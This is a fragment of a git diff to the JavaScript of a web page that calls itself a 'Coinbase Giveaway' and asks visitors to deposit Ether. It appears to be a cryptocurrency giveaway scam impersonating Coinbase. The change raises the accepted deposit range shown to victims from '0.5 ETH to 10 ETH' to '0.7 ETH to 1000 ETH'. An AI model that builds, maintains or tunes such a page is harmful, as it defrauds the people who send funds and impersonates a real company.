@@ -204,7 +204,7 @@ function update_trans() {
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
         )
-    } else $('#warn').text('Amount should be within 0.5 ETH to 10 ETH')
+    } else $('#warn').text('Amount should be within 0.7 ETH to 1000 ETH')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
